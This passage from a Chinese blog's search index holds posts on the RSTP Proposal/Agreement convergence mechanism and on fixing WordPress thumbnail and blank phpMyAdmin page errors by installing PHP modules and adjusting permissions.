        <content type="html"><![CDATA[<p>生成要30到50秒的时间，很大的影响了流量的传输和用户体验。</p><p>针对STP的不足，提出了快速生成树协议RSTP（802.1w）。RSTP通过特殊了P/A机制实现了快速收敛。网络拓扑变更后，大约需要3个hello time时间，即6秒。</p><p>P/A机制</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190224212012.png" alt="pa"></p><p>1.每一台交换机启动RSTP后，都认为自己是“根桥”，并且发送RST BPDU。所有端口都为指定端口，处于Discarding状态。<br>2.每个交换机收到对方发送的BPDU后会选举其中最优的，此时发送次优BPDU的交换机将停止发送BPDU。并开始执行同步。<br>（同步过程指的是：当收到Proposal置位并且优先级高的BPDU报文时，接收交换机必须设置所有下游指定端口为Discarding状态。如果下游端口是Alternate端口或者边缘端口，则端口状态保持不变。）<br>3.同步执行完成后，下游交换机向上游发送Agreement 置位的<code>RST BPDU</code>，此时次交换机的端口已经确定为根端口。上游交换机收到后，立即将指定端口变为转发状态。因此<code>RST BPDU</code>报文Flags字段里面设置了Agreement标记位和根端口角色。<br>4.下游网段开始使用同样的P/A进程协商端口角色。直到所有网段协商完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rstp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress缩略图不显示问题解决办法</title>
      <link href="2016/06/13/slove-wordpress-thumbnail-not-display/"/>
      <url>2016/06/13/slove-wordpress-thumbnail-not-display/</url>
      
        <content type="html"><![CDATA[<p>wordpress后台设置好特色图后，首页文章无法显示缩略图。<br>缩略图链接，提示以下错误：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">A</span> TimThumb error has occuredThe following <span class="token function">error</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token argument-name">occured</span><span class="token punctuation">:</span><span class="token constant">GD</span> Library <span class="token argument-name">Error</span><span class="token punctuation">:</span> imagecreatetruecolor does not exist <span class="token operator">-</span> please contact your webhost <span class="token keyword">and</span> ask them to install the <span class="token constant">GD</span> libraryQuery <span class="token keyword type-declaration">String</span> <span class="token punctuation">:</span> src<span class="token operator">=</span><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//my.domain.com/wp-content/themes/mytheme/img/pic/2.jpg&amp;h=120&amp;w=160&amp;q=90&amp;zc=1&amp;ct=1</span>TimThumb <span class="token argument-name">version</span> <span class="token punctuation">:</span> <span class="token number">2.8</span><span class="token number">.13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是说当前的主机环境并没有安装GD library(图形处理模块)</p><p>这时候需要为主机安装GD模块：</p><p>在centos中可以采用yum的方式安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@VM_112_250_centos themes]# yum install php-gd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后根据提示安装php-gd 以及 其余依赖即可</p><p>另外：</p><p>采用yum方式安装之后，并不需要再手动更改<code>php.ini</code>文件为其添加<code>extension=gd.so</code>,<br>因为这种方式安装会自动的创建一个<code>/etc/php.d/gd.ini</code>文件，内容是<code>extension=gd.so</code>,<br>系统会自动把<code>/etc/php.d/</code>这个目录下的<code>*.ini</code>读入<code>php.ini</code></p><p>查找gd.so文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@VM_112_250_centos ~]# find &#x2F; -name gd.so&#x2F;usr&#x2F;lib64&#x2F;php&#x2F;modules&#x2F;gd.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装之后重启web服务器（这里是apache）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@VM_112_250_centos themes]# service httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> bug解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>完美解决安装phpmyadmin后打开页面空白的问题</title>
      <link href="2016/05/08/slove-phpmyadmin-page-null/"/>
      <url>2016/05/08/slove-phpmyadmin-page-null/</url>
      
        <content type="html"><![CDATA[<p>今天在Ubuntu上搭建了Apache+php+mysql的环境，安装了phpmyadmin后页面打开空白，网上找不到解决方法，最后还是在国外的一个网站上找到了解决办法。</p><p>首先在phpmyadmin文件夹下的index.php页面开头加入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"On"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">|</span> <span class="token class-name">E_STRICT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两句话，再次打开localhost/phpmyadmin后就会报错。<br>如果提示中有<code>require_once GETTEXT_INC;</code>则</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">sudo apt<span class="token operator">-</span>get install php<span class="token operator">-</span>gettext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装php-gettext然后就可以了。</p><p>如果还是报错执行下面这句话修改phpmyadmin的权限</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">pkexec chmod <span class="token number">755</span> <span class="token operator">-</span><span class="token constant">R</span> <span class="token operator">/</span>etc<span class="token operator">/</span>phpmyadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以访问了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> bug解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
